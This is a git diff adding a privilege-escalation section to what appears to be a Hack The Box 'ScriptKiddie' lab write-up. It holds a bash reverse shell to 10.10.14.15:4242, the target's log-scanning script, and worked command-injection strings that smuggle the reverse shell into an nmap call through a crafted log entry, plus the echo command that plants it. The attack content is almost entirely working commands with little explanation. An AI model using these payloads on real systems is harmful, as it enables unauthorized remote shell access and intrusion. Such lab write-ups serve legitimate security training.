@@ -153,3 +153,72 @@ bb9561c6fe02ab1...
 ```
 
 # 提权
+
+
+
+bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
+
+
+
+```
+kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
+cat scanlosers.sh
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+```
+
+
+
+```
+┌──(root💀kali)-[~/htb/ScriptKiddie]
+└─# cat hackers                                        
+2022-06-28 17:34:11.250129 127.0.0.1
+                                                                                                                                               
+┌──(root💀kali)-[~/htb/ScriptKiddie]
+└─# cat /root/htb/ScriptKiddie/hackers | cut -d' ' -f3-
+127.0.0.1
+
+```
+
+
+2022-06-28 17:34:11.250129 127.0.0.1
+
+
+
+
+2022-06-28 17:34:11.250129 ${bash -i >& /dev/tcp/10.10.14.15/4242 0>&1}
+
+
+2022-06-28 17:34:11.250129 bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
+
+
+nmap --top-ports 10 -oN recon/10.10.14.15.nmap 10.10.14.15 2>&1 >/dev/null
+
+
+
+nmap --top-ports 10 -oN recon/127.0.0.1|whoami&&id.nmap 127.0.0.1|whoami&&id >/dev/null
+
+
+
+nmap --top-ports 10 -oN recon/127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id.nmap 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id >/dev/null
+
+
+echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > /home/kid/logs/hackers
+
+
+echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > hackers
+
+
+cat /home/kid/logs/hackers | cut -d' ' -f3-
+
+
+cat /home/kid/logs/hackers | cut -d' ' -f3- | sort -u | while read ip; echo ${ip}
